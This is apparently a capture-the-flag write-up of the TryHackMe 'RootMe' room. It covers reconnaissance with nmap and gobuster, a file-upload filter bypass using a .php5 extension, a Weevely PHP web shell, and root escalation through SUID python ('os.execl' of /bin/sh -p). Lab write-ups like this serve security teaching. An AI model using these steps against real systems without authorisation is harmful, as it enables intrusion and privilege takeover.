# CTF-Write-up

## Try Hack Me: RootMe

##### URL: https://tryhackme.com/room/rrootme

##### Created by _ReddyyZ_

![logo](https://user-images.githubusercontent.com/20625004/109557761-31670f00-7ae1-11eb-8e3f-0d225c8b0f8c.PNG)

You should deploy the machine first.
 
Run nmap against the target machine.

```nmap <target IP>```

![nmap](https://user-images.githubusercontent.com/20625004/109558163-ba7e4600-7ae1-11eb-9b88-719a011b0674.PNG)

We have the first answers to the relevant questions.

Next we fire up gobuster in order to seach for paths in the web application that will help us to map the app.

```gobuster dir -u <target IP> -w <wordlist location>```

![gobuster](https://user-images.githubusercontent.com/20625004/109559704-acc9c000-7ae3-11eb-8d7f-a6f6d609972d.PNG)

We access the panel path and we observe that we can upload files.

![panel](https://user-images.githubusercontent.com/20625004/109559603-8b68d400-7ae3-11eb-838e-27ba5fb39bb4.PNG)

Getting a shell.

Lets try uploading a file containing a reverse shell script written in php. 

I used the Weevely tool, found at  https://github.com/epinna/weevely3. 

```weevely generate <pass> <path>/file1.php5```

Note that when we first try to upload this file as .php, we get an error message saying that we cannot upload this type of file.
After some trial and errors by changing the extension “.php” to “.php5”. we can upload the file.

![upload](https://user-images.githubusercontent.com/20625004/109560562-b6075c80-7ae4-11eb-8e48-8c937299d3b3.PNG)

The we connect with Weevely to the target system.

```weevely <Target Path> <pass that we used in the previous step>```

![shell](https://user-images.githubusercontent.com/20625004/109560957-2dd58700-7ae5-11eb-80b4-7b9450463b45.PNG)

Now that we have access we search for the first flag user.txt

```find -name \user.txt```

```THM{********************}```

![1flag](https://user-images.githubusercontent.com/20625004/109561227-8b69d380-7ae5-11eb-9709-9f5bd3475e0e.PNG)
 
 And we have our first flag.
 
 Now for the second one.
 
 Digging around showed that we need to find a different way to get the root flag. We search for all files with the suid permission.
 
 ```find . perm /4000```
 
 It will provide us with a list of files with the suid set. The one that we can abuse is ```/usr/bin/python```.
 
 Check also https://gtfobins.github.io/gtfobins/python/#shell for more information.
 
 run ```/usr/bin/python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’```
 
 and now ```cat /root/root.txt``` 
 
 ```THM{********************}```
 
 And now we have all the flags.

